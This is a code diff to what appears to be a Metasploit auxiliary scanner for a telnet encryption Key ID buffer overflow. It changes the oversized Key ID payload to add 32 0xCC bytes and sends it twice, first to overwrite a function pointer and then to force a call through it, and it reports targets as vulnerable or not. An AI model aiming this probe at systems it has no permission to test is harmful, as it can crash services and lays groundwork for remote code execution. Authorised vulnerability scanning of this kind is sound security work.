@@ -64,11 +64,14 @@ class Metasploit3 < Msf::Auxiliary
 					break if data.index("\xff\xfa\x26\x02\x01")
 				end
 
-
 				buff_good = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 63) + "\xff\xf0"
-				buff_long = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 64) + "\xff\xf0"
+				buff_long = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 64) + ( "\xcc" * 32) + "\xff\xf0"
 				
 				begin
+				
+					#
+					# Send a long, but within boundary Key ID
+					#
 					sock.put(buff_good)
 					data = sock.get_once(-1, 5) rescue nil
 					unless data
@@ -81,18 +84,39 @@ class Metasploit3 < Msf::Auxiliary
 						return
 					end
 					
+					#
+					# First round to overwrite the function pointer itself
+					#
 					sock.put(buff_long)
-					data = sock.get_once(-1, 5) rescue nil
+					data = sock.get_once(-1, 5)
 					unless data
-						print_status("#{ip}:#{rport} NOT VULNERABLE: No reply to 64-byte Key ID: #{banner_sanitized}")
+						print_status("#{ip}:#{rport} NOT VULNERABLE: No reply to first long Key ID: #{banner_sanitized}")
 						return
 					end
-					
+
 					unless data.index("\xff\xfa\x26\x08\xff\xf0")
-						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
+						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to first Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
 						return
 					end			
-	
+
+					#
+					# Second round to force the fucntion to be called
+					#
+					sock.put(buff_long)
+					data = sock.get_once(-1, 5)
+					unless data
+						print_status("#{ip}:#{rport} NOT VULNERABLE: No reply to second long Key ID: #{banner_sanitized}")
+						return
+					end
+
+					unless data.index("\xff\xfa\x26\x08\xff\xf0")
+						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to second Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
+						return
+					end		
+					
+					print_status("#{ip}:#{rport} NOT VULNERABLE: Service did not disconnect: #{banner_sanitized}")
+					return
+					
 				rescue ::EOFError	
 				end						
 				
